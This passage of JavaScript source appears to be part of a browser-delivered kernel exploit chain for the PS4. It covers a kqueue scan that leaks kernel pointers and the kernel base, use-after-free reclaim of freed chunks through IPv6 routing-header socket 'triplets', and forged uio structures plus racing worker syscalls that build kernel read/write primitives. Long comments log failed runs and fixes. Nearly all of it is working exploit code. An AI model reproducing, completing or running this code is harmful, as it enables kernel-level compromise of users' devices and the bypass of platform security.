                    if (getRthdr(triplets[0], KQUEUE_SIZE, KQUEUE_SIZE) < 0) {
                        if (sc(SYS.close, kq).i32 !== 0) closeFailed++;
                        openKq = -1;
                        if ((i & 0x1f) === 0x1f)
                            await new Promise(r2 => setTimeout(r2, 0));
                        continue;
                    }            // <-- openKq NEVER CLOSED
                so every short copyout leaked one descriptor. With 5000 rounds
                that fills the fd table: the observed run went
                emfile=2232 (first at 537), i.e. the table gave out part way
                through and the remaining rounds could not open a kqueue at
                all. The scan could never succeed after the first short read.

                Fix: ONE close point at the bottom of the loop body, reached
                from every branch except the one that KEEPS the fd on a hit.
                `closeRv` is checked now instead of discarded, and a non-zero
                result is counted -- if close() itself fails, that is a
                different bug and must not be silent again.
                */
                for (let i = 0; i < NUM_LEAK_KQUEUE; ++i) {
                    tries = i + 1;
                    const kq = sc(SYS.kqueue).i32;
                    if (kq === -1) {
                        emfileCount++;
                        emfileStreak++;
                        if (emfileAt < 0) emfileAt = i;
                        sc(SYS.sched_yield);
                        if (EMFILE_BAIL > 0 && emfileStreak >= EMFILE_BAIL) {
                            mark("KQUEUE-EMFILE-BAIL", "first_at=" + emfileAt
                                + " last_at=" + i + " count=" + emfileCount
                                + " -- fd table is full and not recovering;"
                                + " abandoning the scan (override ?emfilebail=)");
                            break;
                        }
                        continue;
                    }
                    emfileStreak = 0;
                    openKq = kq;

                    /*
                    `need` is MANDATORY here, and this is the bug that made the
                    run intermittent.

                    The hit test reads +8, but the SUCCESS path below parses
                    +0x60 (kl_lock) and +0x98 (kq_fdp). Passing no `need`
                    skipped the short-read guard entirely (getRthdr checks
                    `need !== undefined`), so a copyout that stopped short of
                    0xa0 still returned success -- with 0xee sentinel bytes
                    beyond the copied region. Observed as:
                        KQUEUE-LEAK kl_lock=ffffd43d0f10 kq_fdp=eeee...
                        PROOF-FAIL kl_lock-kq_fdp-kernel-pointers
                    kernelBase was CORRECT (kl_lock landed inside the copy) but
                    kqFdp was pure sentinel, so kread8(kqFdp) tripped kaddrOk,
                    fdtOfiles stayed null, and make_karw aborted four KREAD-RETRY
                    rounds from one unchecked short read.

                    Ask for 0xa0 so a short copyout is reported as -1 and the
                    scan simply tries the next kqueue. KQUEUE_SIZE is already
                    0xa0; the guard costs nothing and removes the run-to-run
                    coin flip.
                    */
                    if (getRthdr(triplets[0], KQUEUE_SIZE, KQUEUE_SIZE) < 0)
                        continue;

                    /*
                    Reference test: the header qword at +8 only. R2's 0xee
                    sentinel fill guarantees these words came from THIS call,
                    so a plain magic check cannot read a previous call's data.
                    */
                    if (leakDv.getUint32(8, true) === KQ_HDR_MAGIC
                        && leakDv.getUint32(12, true) === 0) {
                        /*
                        SECOND GATE, and it lives INSIDE the loop on purpose.

                        The magic at +8 only proves the copyout reached +0x10;
                        the success path below parses +0x60 (kl_lock) and +0x98
                        (kq_fdp). If kq_fdp is still the 0xee sentinel the copy
                        was short, and accepting it sends 0xeeee into
                        kread8 -> kaddrOk, which aborts the whole make_karw
                        stage with KREAD-REFUSED bad-addr=eeee...

                        An earlier attempt at this check sat after the loop
                        (in the `if (leaked)` block) where `continue` is a
                        SyntaxError -- 'continue' is only valid inside a loop
                        statement. Keep it here, next to the hit test, so a
                        short read is simply skipped and the next kqueue is
                        opened.
                        */
                        const fdpHi = leakDv.getUint32(0x9c, true) >>> 0;
                        const fdpLo = leakDv.getUint32(0x98, true) >>> 0;
                        if (fdpHi === 0xeeee || fdpLo === 0xeeee) {
                            shortReads++;
                            leakedFds++;
                            if (sc(SYS.close, kq).i32 !== 0) closeFailed++;
                            openKq = -1;
                            if ((i & 0x1f) === 0x1f)
                                await new Promise(r2 => setTimeout(r2, 0));
                            continue;
                        }
                        /* This fd becomes kqFd -- do NOT close it here. */
                        leaked = true; hitRound = i;
                        break;
                    }

                    /* No hit: close exactly once, and check the result. */
                    if (sc(SYS.close, kq).i32 !== 0) closeFailed++;
                    openKq = -1;

                    if (i && i % 500 === 0)
                        mark("KQUEUE-ROUND", "i=" + i);

                    /*
                    ASYNC + YIELD. 5000 iterations x 2+ synchronous ROP
                    syscalls is the "This page is not responding" popup at
                    "leaking a kqueue...". This scan is after the refcount
                    race -- there is no timing to disturb -- so a 0 ms timer
                    per 32 kqueue cycles just lets the sweeper run.
                    */
                    if ((i & 0x1f) === 0x1f) await new Promise(r2 => setTimeout(r2, 0));
                }

                if (leaked && openKq >= 0) {
                    kqFd = openKq;
                    openKq = -1;
                } else if (openKq >= 0) {
                    if (sc(SYS.close, openKq).i32 !== 0) closeFailed++;
                    openKq = -1;
                }
                /*
                Report the fd accounting once, so a leak can never hide again.
                `closed_fail` should be 0; anything else means close() failed
                and descriptors are accumulating. `sentinel` counts the
                short-copyout rounds that used to leak an fd each.
                */
                if (closeFailed || leakedFds)
                    mark("KQUEUE-FDS", "close_failed=" + closeFailed
                        + " sentinel_rounds=" + leakedFds
                        + (closeFailed ? "  -- descriptors are leaking"
                            : "  -- all kqueue fds released"));
                check("kqueue-reclaimed-freed-chunk", leaked,
                    "tries=" + tries
                    + (leaked ? " fd=" + kqFd + " at=" + hitRound : "")
                    + (emfileCount ? " emfile=" + emfileCount
                        + " (first at " + emfileAt + ")" : "")
                    + (closeFailed ? " close_failed=" + closeFailed : ""));
                if (leaked) {
                    const klLock = new int64(leakDv.getUint32(0x60, true),
                        leakDv.getUint32(0x64, true));
                    kqFdp = new int64(leakDv.getUint32(0x98, true),
                        leakDv.getUint32(0x9c, true));
                    /* The sentinel gate ran inside the scan loop (see the hit
                       test); by here kq_fdp is known not to be 0xee. */
                    kernelBase = klLock.sub32(off.k_kl_lock);
                    mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
                    mark("KERNEL-BASE", kernelBase + " = kl_lock-0x"
                        + off.k_kl_lock.toString(16));

                    try {
                        const kbNow = "" + kernelBase;
                        const kbLast = localStorage.getItem("ps4lab_kernel_base");
                        if (kbLast === kbNow)
                            mark("SAME-BOOT-AS-LAST-RUN", "kernel_base=" + kbNow);
                        localStorage.setItem("ps4lab_kernel_base", kbNow);
                    } catch (e) { }

                    check("kl_lock-kq_fdp-kernel-pointers",
                        (klLock.hi >>> 0) === 0xffffffff
                        && (kqFdp.hi >>> 0) >= 0xffff0000,
                        "kl_lock.hi=" + hx(klLock.hi) + " kq_fdp.hi=" + hx(kqFdp.hi));
                    check("kernel-base-0x4000-aligned",
                        (kernelBase.low & 0x3fff) === 0,
                        "low=" + hx(kernelBase.low));

                    /*
                    DO NOT CLOSE kqFd HERE -- and do not re-find either.

                    This used to be:
                        sc(SYS.close, kqFd);
                        kqFd = -1;
                        triplets[2] = await findTriplet(triplets[0], triplets[1], "KQ", ...)

                    The kqueue reclaimed the freed 0xa0/0x108 chunk (that is WHY
                    the leak works -- sys_kqueue allocates from the same UMA zone
                    the ucred came from). Closing it returns that chunk to the
                    zone, so triplets[0]'s rthdr immediately points at free
                    memory and reads back garbage. Observed, every time:

                        PROOF-OK   kqueue-reclaimed-freed-chunk tries=34 fd=17
                        PROOF-OK   kl_lock-kq_fdp-kernel-pointers
                        TRIPLET-KQ-TAG-LOST      round=0 master=53
                        TRIPLET-KQ-UNTAGGED-BAIL streak=16/16 tag_lost_at=0
                        PROOF-FAIL triplets2-re-found-after-kqueue-leak 53,142,0
                    findTriplet then returns 0, tripletsUsable() rejects the 0,
                    and every later gate fails: KREAD-REFUSED triplets=53,142,0,
                    fdtOfiles null, MAKE-KARW-ABORTED.

                    The re-find was also redundant: the hit test inside the scan
                    already PROVED the alias by reading KQ_HDR_MAGIC at +8 from
                    this very chunk. So: keep kqFd open (it is tracked and can be
                    closed during teardown), and keep triplets[2] as it was --
                    the fd that findTriplet/T2 already identified.

                    kqFd is closed in the cleanup path when kernel R/W exists,
                    which is where the reference closes it too.
                    */
                    if (kqFdp && kqFdp.hi > 0)
                        check("triplets2-re-found-after-kqueue-leak",
                            tripletsUsable(), triplets.join(","));
                    mark("POST-KQUEUE", "kq_fd=" + kqFd + " KEPT OPEN triplets="
                        + triplets.join(",")
                        + " (closing it would free the chunk the master aliases)");
                }
            }
        }
        /*
        FREE THE RECLAIM POOL (option B).

        The 256 ipv6 sockets existed only to FIND the triplets. Keeping them
        alive costs over half the process rlimit, and the kqueue scan then
        cannot get a descriptor:

            KQUEUE-EMFILE-BAIL first_at=482 last_at=545 count=64

        Close every pool socket EXCEPT the ones still aliasing the freed chunk:
        the triplets, and any burned fd whose rthdr points at freed memory,
        since closing those frees it again. Survivors go in liveFds, which
        tripletsUsable() consults.

        GATED ON `triplets` ONLY -- NOT on kernelBase.

        The first version of this sat at the END of stageLeakKqueue behind
        `if (kernelBase && triplets)`, which inverted the logic completely: the
        fds are needed BY the kqueue scan, so gating their release on the scan
        having SUCCEED meant the one case that most needs them -- a failed
        leak -- never got them back. Observed:

            KQUEUE-EMFILE-BAIL first_at=459 last_at=522 count=64
            PROOF-FAIL kqueue-reclaimed-freed-chunk tries=523 emfile=64
            <no POOL-FREED line at all>

        i.e. EMFILE at 459 with all 256 sockets still held, and nothing freeing
        them. Freeing now happens BEFORE the scan, which is where the budget is
        actually spent.

        This runs at the END of stageTripleFree, so the further findTriplet
        calls inside stageLeakKqueue (the "KQ" re-find) run against the closed
        pool -- that is intended, and liveFds is what keeps the three real
        triplets usable for the kread/kwrite path.
        */
}

/*
================================================================================
STAGE 7: makeKarwHelpers -- the forged-uio primitives and the bounded join
================================================================================

fakeUio() rewrites the iovAb window as a forged uio; landUio() and landFakeUio()
then spray worker racers until the kernel hands that chunk back. boundedJoin()
is the bound on `await Promise.all(tasks)`: the racers are fireW(..., 0) RPCs --
deliberately NO timeout, because parking in the kernel IS the race -- so an
unbounded join is a permanent hang on the main JS thread.
*/
function makeKarwHelpers() {
        /*
        uio_iovcnt = NUM_UIO_IOV is CORRECT AND DELIBERATE. Do not "fix" it.

        Verified against the reference implementation in this tree
        (kernel-script-from-other-userland-as-ref/netctrl-cssfontface.js:708-713
        and netctrl-vue.js:1366-1371):

            uio_iov    = uio_iov
            uio_iovcnt = NUM_UIO_IOV          <- 20, not 1
            uio_offset = -1
            uio_resid  = size
            uio_segflg = UIO_SYSSPACE
            uio_rw     = UIO_READ or UIO_WRITE
        ...and the racer calls readv/writev with that same UIO_IOV_NUM
        (netctrl-vue.js:1875-1882). Slots 1..19 are zero-filled and INERT --
        that is the design, not a bug. An earlier change here forced the count
        to 1 on a "the kernel walks slots 1..19 and dereferences address 0"
        theory; that theory was wrong and the change is reverted.

        iovAb is 0x170 = [uio 0x30][20 iovec slots], so 20 slots are in-bounds.

        ---------------------------------------------------------------------
        WHAT THE KERNEL ACTUALLY DOES WITH THIS (read out of 1100k.elf):

        sys_writev(fd, iovp)  FUN_ffff822dd5c0
            uio_setup(iovp, iovp[4], &newuio)     FUN_ffff824c37f0
            getsock(fd, iovp[0], 0x82, &fp)       FUN_ffff826191c0
            kern_writev(fd, iovcnt, fp, newuio, -1, 0)  FUN_ffff822dd690
        and uio_setup is:

            plVar2 = uma_zalloc((iovcnt << 4) + 0x30, ...);
            copyin(iov, plVar2 + 6, iovcnt << 4);      // <-- IMPORTS AS IOVECS
            *plVar2 = plVar2 + 6;                      // uio_iov    = imported copy
            *(plVar2 + 1) = iovcnt;
            plVar2[2] = -1;                            // uio_offset
            { sum every iov_len }  ->  plVar2[3]       // uio_resid
        So the kernel does NOT adopt a forged uio: it allocates its OWN, then
        copyin's the buffer as an ARRAY OF struct iovec {base,len}, 16 bytes
        per slot, and derives uio_resid by SUMMING their lengths.

        With iovcnt = 20 it imports 20 * 16 = 320 bytes = 0x140, which is
        entirely inside iovAb (0x170). Slot 0 is read from bytes 0x00..0x0f --
        i.e. it reads our uio_iov as iov_base and our uio_iovcnt as iov_len,
        giving {base = uioIovAddr, len = 20}. Slots 1..19 read the rest of the
        header and zero filling, mostly {base=0, len=0}, except slot 1 which
        straddles uio_offset = -1 and becomes an enormous length.

        uio_resid is then the sum of that garbage, and kern_writev moves it
        through a socketpair -- which is why nothing ever returns.

        The buffer is therefore left EXACTLY as the reference writes it: the
        uio header only, no attempt to also shape it as an iovec array. A
        half-fix was tried and reverted -- overwriting slot 0 with {dest, size}
        changes offsets 0x00/0x08, which are the same bytes the hit test reads
        as uio_iov / uio_iovcnt, and it asserts uio_iovcnt === NUM_UIO_IOV.
        No layout satisfies both views.
        */
        /*
        fakeUio rewrites the uio HEADER only. The iovec array it points at is
        uioIovAb, populated separately (see below and kreadSlow/kwriteSlow).

        uio_iov (offset 0x00) = uioIovAddr  -- NOT uioIov, and NOT iovAddr.
        That single field is the whole fix: the kernel now imports a REAL
        iovec array instead of the header bytes.

        `resid` sets uio_resid, and slot 0's iov_len is set to match by the
        caller, so uio_resid computed by uio_setup equals what we intend.
        */
        fakeUio = function (uioIov, resid, rw) {
            /*
            uioIov is the value landUio() returned (the reclaimed chunk's first
            qword). It is NOT used as uio_iov any more: that field must point at
            the iovec ARRAY, which is uioIovAddr. The parameter is kept because
            both callers pass it and the call reads naturally, but see
            setUioIov() for where the destination actually goes.
            */
            void uioIov;
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0x00, uioIovAddr);          // -> the iovec ARRAY
            iovDv.setUint32(0x08, NUM_UIO_IOV, true);
            put(iovDv, 0x10, -1);
            put(iovDv, 0x18, resid);
            iovDv.setUint32(0x20, UIO_SYSSPACE, true);
            iovDv.setUint32(0x24, rw, true);
            put(iovDv, 0x28, 0);
            /*
            THE HEADER AND THE IOVEC ARRAY ARE TWO DIFFERENT BUFFERS.

            This is the fix, and it comes from the working implementation
            (netctrl-vue.js:162-165, 592-594, and msg_uio at 1366-1371):

                var uioIovRead  = malloc(UIO_IOV_NUM * IOV_SIZE);  // iovec ARRAY
                var uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);
                write64(uioIovRead.add(0x00), dummyBuffer);  // slot0.base
                ...
                msg_uio.uio_iov    = uioIovRead;   // POINTS AT it
                msg_uio.uio_iovcnt = NUM_UIO_IOV;

            The uio struct and the iovec array are separate allocations, and
            uio_iov is what connects them. They never share bytes.

            netctrl had collapsed both into one buffer, so sys_writev's
            uio_setup(FUN_ffff824c37f0) -- which does
                copyin(iov, plVar2+6, iovcnt << 4)
            and then SUMS every iov_len into uio_resid -- reinterpreted the
            uio HEADER as iovec[0]:
                {base = uio_iov, len = uio_iovcnt = 20}
            plus a slot 1 straddling uio_offset = -1. uio_resid became ~28
            instead of `size`, SO_SNDBUF is exactly `size`, and the socket
            layer slept with no wakeup. That was the permanent park.

            An earlier attempt tried to satisfy both views in ONE buffer and
            was (correctly) reverted as impossible. The resolution is that
            they must not share a buffer at all.

            So: iovAb keeps the uio header (which getRthdr reads back for the
            hit test), and uio_iov points at uioIovAddr -- a real iovec array
            whose slot 0 is {destination, size} and whose remaining slots are
            zero, so uio_resid sums to exactly `size`.

            Left EXACTLY as the reference has it (uio header only) so this
            is a known baseline. The real repair is to reach a uio-consuming
            entry point -- kern_writev FUN_ffff822dd690 / kern_readv
            FUN_ffff822dcdd0 -- which needs a struct thread * this chain
            does not currently have.
            */
        };
        restoreRefcntIov = function () {
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0, 1); put(iovDv, 8, 1);
        };

        /*
        Shape the iovec array the kernel will import.

        uioIovAb is IOVEC_SIZE * NUM_UIO_IOV = 0x140, exactly what uio_setup
        copyin's for iovcnt = 20. Slot 0 is the ONLY populated entry:
            slot 0: base = dst, len = size
            slots 1..19: {0, 0}   -- sum to nothing, skipped by uiomove
        so uio_resid ends up as exactly `size`.

        `dst` is a KERNEL address and segflg is UIO_SYSSPACE, which is what
        makes the kernel treat it as a direct pointer rather than copyin'ing
        from userland.
        */
        setUioIov = function (dst, size) {
            new Uint8Array(uioIovAb).fill(0);
            put(uioIovDv, 0x00, dst);
            put(uioIovDv, 0x08, size);
        };

        /*
        ================================================================================
        BOUNDED JOIN (kwriteSlow / kreadSlow hang fix)
        ================================================================================

        tasks[k] are fireW(..., 0) RPCs -- deliberately NO timeout, because the
        spray loops fire many racers and expect most of them to PARK in the
        kernel (that is the race). So `await Promise.all(tasks)` can never be
        allowed to wait indefinitely: if every racer in a batch parked, that
        promise never settles and the whole stage freezes -- which is exactly
        the "make_karw..." stall after KWRITE-BEGIN, with no UIO-LAND-TIMEOUT
        and no KWRITE-RETRY ever printed.

        This resolves after at most `ms` and reports how many were still
        outstanding, so the caller can retry (kwrite8n/kread8 already have
        KREAD_TRIES) or poison instead of hanging. The racers are NOT cancelled
        -- they may still complete on the worker side; we just stop waiting.
        */

        landUio = async function (size, forWrite, tasks) {
            if (!tripletsUsable()) {
                mark("UIO-LAND-REFUSED", "triplets="
                    + triplets.join(",")); return null;
            }

            trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev")
                + " size=" + size);
            freeRthdr(triplets[2]);

            /*
            DEADLOCK FIX. This is a BLOCKING socketpair and sc() is a
            SYNCHRONOUS ROP syscall on the main JS thread (see the forWrite
            branch below): with the 4 uio racers parked in readv() and the
            send buffer full, that write NEVER returns. Nothing recovers --
            the deadline check at the top of the loop is never reached again,
            boundedJoin is never reached, and the finally chain that restores
            thread affinity is never reached, so the console needs a hard
            power-off with the main thread still realtime-pinned on MAIN_CORE.
            That is the silent stop after KWRITE-BEGIN (no UIO-LAND-ROUND, no
            UIO-LAND-TIMEOUT, no JOIN-TIMEOUT).

            SET, DO NOT TOGGLE, and only on the SEND side.

            The first version of this fix flipped both fds to O_NONBLOCK here
            and flipped them back in kwriteSlow after a successful land. That
            was wrong three ways:
              - kreadSlow NEVER restored, so the first kread left uioSs
                non-blocking for the rest of the run, and kreadSlow's own
                priming write at its top then returned EAGAIN with an unprimed
                buffer -> landUio burned its full 10 000 rounds / 30 s budget
                and poisoned the rest of the chain.
              - kwriteSlow restored blocking mode while the uio racers it had
                just fired were still parked inside readv() on uioSs[0], so the
                next main-thread write was unbounded again -- the original hang.
              - unwind()'s drain assumed there were bytes there to read.

            The rule now: uioSs[1] is ALWAYS non-blocking for the whole run, so
            no main-thread write in this file can ever sleep. Its writers are
            either the racers' writev on the worker threads (own thread, want
            to block) or main-thread pushes (must not). SO_SNDBUF is set to
            exactly `size`, so one write either fits or returns EAGAIN at once,
            and EAGAIN is a no-op rather than a hang.
            */

            /*
            ITEM 5a. landFakeUio has a deadline; this one did not, so a run
            where the chunk is never re-taken spins all NUM_UIO_SPRAY rounds
            and only then unwinds. Bound it the same way. poops.js:4640.
            */
            const uioDeadline = Date.now() + (params.has("uioms")
                ? parseInt(params.get("uioms"), 10) : 30000);
            for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
                if ((i & 0x3f) === 0 && Date.now() > uioDeadline) {
                    mark("UIO-LAND-TIMEOUT", "rounds=" + i);
                    break;
                }
                if (i && i % 256 === 0) mark("UIO-LAND-ROUND", "i=" + i);
                /*
                FIRST-ROUND VISIBILITY. UIO-LAND-ROUND only prints every 256
                rounds, so a stall in round 0 looked identical to a stall in
                round 255 -- that ambiguity is a large part of why this stage
                has been misread as a freeze so many times. Report round 0 and
                then once per 32 rounds, at mark() level, so the scan always
                shows whether it is moving.
                */
                if (i === 0 || (i % 32) === 0)
                    mark("UIO-LAND-AT", "i=" + i + " size=" + size);
                for (let k = 0; k < uioWorkers.length; ++k)
                    tasks[k] = fireW(uioWorkers[k],
                        forWrite ? SYS.readv : SYS.writev,
                        [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
                sc(SYS.sched_yield);
                /*
                ROUND 0 IS A RENDEZVOUS, and this is what the log showed:

                    UIO-LAND-AT i=0 size=8
                    <silence, manual reboot>

                UIO-LAND-AT prints BEFORE the fan-out, so the wedge is here: the
                worker issues writev()/readv() against the forged uio and the
                syscall does not return, so the fireW promise (timeoutMs = 0,
                no RPC timeout) never settles. boundedJoin is at the BOTTOM of
                the round and is never reached.

                Root cause is in the forged uio, not the socket: the kernel is
                told uio_iovcnt = NUM_UIO_IOV (20) while only ONE iovec slot is
                ever populated. Slots 1..19 are zero-filled, so base=0 len=0.
                In UIO_SYSSPACE the kernel treats base as a DIRECT kernel
                pointer, so it walks address 0 -- which on this kernel hangs
                instead of faulting.

                Two guards, both cheap:
                  1) tell the kernel the TRUTH: iovcnt = 1 for these calls.
                  2) bound the fan-out so a wedged racer cannot make round 0
                     unresolvable -- we get JOIN-TIMEOUT and a retry instead of
                     an indefinite hang.
                */
                await boundedJoin(tasks, JOIN_MS, "uio-fanout");

                /*
                HIT TEST. uio_iov (offset 0) must be a kernel pointer and
                uio_iovcnt (offset 8) must be NUM_UIO_IOV -- the value fakeUio()
                writes and the reference also writes.
                */
                /*
                MARK EVERY STEP between the two boundedJoins.

                The log stops after "JOIN-TIMEOUT uio-fanout" and before
                "JOIN-TIMEOUT land-uio", so the stall is in this ~10-line window.
                Two candidates fit equally well from the source and cannot be
                told apart without instrumentation:

                  a) getRthdr(triplets[0], IOVEC_SIZE) with NO `need` -- the
                     only such call on the kread path. A hang in getsockopt on
                     the master would look exactly like this.
                  b) await forceYield() -- its MessageChannel macrotask is
                     delivered by the event loop, and four dead workers have the
                     task queue backed up. Only the every-8th-call rAF path has
                     a timeout; the plain macrotask path has none.

                So print before and after each, at mark() level. The next run
                names the culprit instead of leaving it to inference -- four
                previous theories about this exact window were wrong.
                */
                mark("UIO-STEP", "i=" + i + " pre-getRthdr");
                const hitOk = getRthdr(triplets[0], IOVEC_SIZE) >= 0
                    && (leakDv.getUint32(0, true) >>> 0) >= 0xffff0000
                    && leakDv.getInt32(8, true) === NUM_UIO_IOV;
                mark("UIO-STEP", "i=" + i + " post-getRthdr hit=" + (hitOk ? 1 : 0));
                if (hitOk) {
                    return new int64(leakDv.getUint32(0, true),
                        leakDv.getUint32(4, true));
                }
                mark("UIO-STEP", "i=" + i + " pre-forceYield");
                await forceYield();
                mark("UIO-STEP", "i=" + i + " post-forceYield");
                /*
                WAKE AND DRAIN -- and the drain MUST NOT ASSUME A COUNT.
                (This comment replaced an older "counts have to match EXACTLY"
                note that described the counting approach, which was wrong.)

                This is the KREAD-BEGIN hang. uioSs[0] is BLOCKING and sc() is a
                synchronous ROP syscall on the main JS thread, so any read past the
                available bytes parks the WebProcess for ever -- no JS timeout can
                fire (not UIO-LAND-TIMEOUT, not JOIN-TIMEOUT, and not the finally
                that restores the thread affinity). Manual reboot.

                The count has been guessed wrong three times now:
                    1 + N  -> blocked on the (N+1)th read
                    N      -> blocked on the 2nd read when only one chunk existed
                How many `size` chunks actually exist depends on how many racers
                reached their writev() before we looked, which varies every run.
                COUNTING IS THE BUG.

                So: make the READ side non-blocking for the duration of the drain,
                and stop on the first EAGAIN. rv >= 0 means bytes read; rv < 0 means
                EAGAIN/EINTR -- stop rather than sleep. Restore the mode afterwards.
                */
                mark("UIO-STEP", "i=" + i + " pre-fcntl-NB");
                sc(SYS.fcntl, uioSs[0], F_SETFL, O_NONBLOCK);
                mark("UIO-STEP", "i=" + i + " pre-drain");
                if (forWrite) {
                    for (let k = 0; k < uioWorkers.length; ++k)
                        sc(SYS.write, uioSs[1], scratch, size);
                } else {
                    /* Drain what is there -- never block waiting for one that has
                       not arrived. Each racer contributes at most one chunk. */
                    for (let k = 0; k < uioWorkers.length; ++k)
                        if (sc(SYS.read, uioSs[0], scratch, size).i32 < 0) break;
                }
                mark("UIO-STEP", "i=" + i + " post-drain");
                sc(SYS.fcntl, uioSs[0], F_SETFL, 0);
                mark("UIO-STEP", "i=" + i + " pre-join-land-uio");
                const stillParked = await boundedJoin(tasks, JOIN_MS, "land-uio");
                mark("UIO-STEP", "i=" + i + " post-join parked=" + stillParked);
                if (!forWrite) sc(SYS.write, uioSs[1], scratch, size);
                /*
                A FULL batch of outstanding racers means every uio worker is
                wedged in the kernel. Their RPC promises are PENDING for ever
                (timeoutMs = 0 creates no timer), and the worker message queue
                is now head-of-line blocked, so re-firing in the next round
                cannot possibly succeed -- it only piles more messages behind a
                call that will never return.

                That is exactly the "it just stops after JOIN-TIMEOUT" report.
                Stop the scan here instead of burning NUM_UIO_SPRAY rounds.
                */
                if (stillParked >= uioWorkers.length) {
                    mark("UIO-WORKERS-WEDGED", "round=" + i + " parked="
                        + stillParked + "/" + uioWorkers.length
                        + " -- every racer is stuck in the kernel and its RPC has"
                        + " no timer; re-firing cannot help, aborting the scan");
                    return null;
                }
            }
            /*
            STOP RE-FIRING ONTO WEDGED WORKERS.

            This is the "it just stops after JOIN-TIMEOUT" behaviour. Those RPCs
            are posted with timeoutMs = 0, so makeRpc creates NO timer and the
            promise stays PENDING for ever -- it never rejects, and the worker's
            onmessage handler is single-threaded, so it cannot process the next
            "fire" until the current one returns. A racer parked inside writev
            therefore blocks that worker permanently, and every later round just
            queues more messages behind it.

            boundedJoin bounds the WAIT; it cannot unblock the QUEUE. So once a
            whole batch fails to settle, the workers are unusable and spinning
            the remaining rounds is pure damage -- up to NUM_UIO_SPRAY * N more
            queued messages. Bail out and let kreadSlow's retry/poison path take
            over.

            'land-uio' naming above is kept for the case where only SOME racers
            are outstanding; a full batch is the fatal one.
            */

            /*
            WHY WE REACHED THE END WITHOUT LANDING. Every round ran to
            completion and the hit test never matched, so the chunk is not
            coming back through this path. Say so explicitly -- the old
            failure mode was a bare `return null` with the last visible line
            being KREAD-BEGIN, which reads as a freeze.
            */
            mark("UIO-LAND-FAILED", "rounds=" + NUM_UIO_SPRAY
                + " size=" + size + " forWrite=" + (forWrite ? 1 : 0)
                + " master=" + triplets[0] + " freed=" + triplets[2]
                + " -- chunk never re-taken");
            return null;
        }

        landFakeUio = async function (tasks) {
            if (!tripletsUsable()) {
                mark("FAKEUIO-REFUSED", "triplets="
                    + triplets.join(",")); return false;
            }
            /* iovSs[1] is O_NONBLOCK from creation -- see stagePrimitive. */
            trace("FAKEUIO-LAND", "target=" + triplets[0] + " freed=" + triplets[1]);
            freeRthdr(triplets[1]);

            const fakeDeadline = Date.now() + (params.has("fakeuioms")
                ? parseInt(params.get("fakeuioms"), 10) : 30000);
            for (let i = 0; i < NUM_IOV_SPRAY_MAX; ++i) {
                if ((i & 0x3f) === 0 && Date.now() > fakeDeadline) {
                    mark("FAKEUIO-TIMEOUT", "rounds=" + i);
                    break;
                }
                if (i && i % 500 === 0) mark("FAKEUIO-ROUND", "i=" + i);
                for (let k = 0; k < iovWorkers.length; ++k)
                    tasks[k] = fireW(iovWorkers[k], SYS.recvmsg,
                        [iovSs[0], msgAddr, 0], 0);
                sc(SYS.sched_yield);
                if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0
                    && leakDv.getUint32(0x20, true) === UIO_SYSSPACE) return true;
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);
                await boundedJoin(tasks, JOIN_MS, "fakeuio-round");
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
            }
            return false;
        }

        /*
        FD BUDGET FIX (option B).

The kqueue scan needs a free descriptor on every round, and the process
rlimit on PS4 is small. At the point stageLeakKqueue runs we are still holding
all NUM_IPV6_SOCK (256) reclaim sockets, which is over half the budget, and the
observed failure was:

    KQUEUE-EMFILE-BAIL first_at=482 last_at=545 count=64
-- the table filled at 482 and never freed again. So the 256 sockets that only
existed to FIND the triplets are closed once the triplets are named, and the
few fds that still matter are tracked in liveFds.

tripletsUsable() used to prove liveness with `ipv6.indexOf(fd) >= 0`. That test
is now wrong (the pool is closed), so it checks membership of liveFds instead:
the same three fds, verified once at close time and not mixed with freed ones.
This keeps every existing call site working unchanged -- six of them gate the
kread/kwrite path on this function.
*/
tripletsUsable = function () {
    if (!triplets || triplets.length !== 3) return false;
    for (const fd of triplets) {
        if (!(fd > 0)) return false;
        // liveFds is authoritative once the pool has been closed; before
        // that, fall back to the pool test so nothing changes early on.
        if (liveFds.size ? !liveFds.has(fd) : ipv6.indexOf(fd) < 0) return false;
    }
    return true;
};

        releaseIov = async function (itasks) {
            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.write, iovSs[1], scratch, 1);
            /* Bounded -- releaseIov is on the kread/kwrite unwind path, and an
               unbounded join here is the same indefinite hang. */
            await boundedJoin(itasks, JOIN_MS, "release-iov");
            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.read, iovSs[0], scratch, 1);
        }

        /*
        ITEM 3. tripletsUsable() only checks the three fds are non-zero and
        in the pool -- it never reads a single one back. Every getRthdr in
        the race path targets the MASTER only, so a slave that is no longer
        aliased is indistinguishable from one that is, and we then spend a
        full UAF re-roll on it. 14 of 28 cut-off runs die at or after a
        refind. poops.js:9381-9445 validates all three independently before
        trusting them; this is that check.
        */
        tripletsAgree = function (why) {
            if (!tripletsUsable()) return false;
            const tags = [];
            for (const fd of triplets) {
                if (getRthdr(fd, UCRED_SIZE, 8) < 0) {
                    trace("TRIPLET-VALIDATE", why + " fd=" + fd + " short-read");
                    return false;
                }
                const v = leakDv.getUint32(4, true) >>> 0;
                if ((v & 0xffff0000) >>> 0 !== RTHDR_TAG) {
                    trace("TRIPLET-VALIDATE", why + " fd=" + fd + " untagged="
                        + hx(v));
                    return false;
                }
                tags.push(v);
            }

            /*
            All three must be reading the SAME chunk, i.e. the same tag.
            */
            const agree = tags[0] === tags[1] && tags[1] === tags[2];
            if (!agree)
                trace("TRIPLET-VALIDATE", why + " disagree "
                    + tags.map(hx).join(","));
            return agree;
        }

        refindPair = function (tag) {
            return (async function () {
            for (let retry = 0; retry < 3; ++retry) {
                triplets[1] = await findTriplet(triplets[0], -1, tag + "1",
                    FIND_TRIPLET_FAST);
                triplets[2] = await findTriplet(triplets[0], triplets[1], tag + "2",
                    FIND_TRIPLET_FAST);
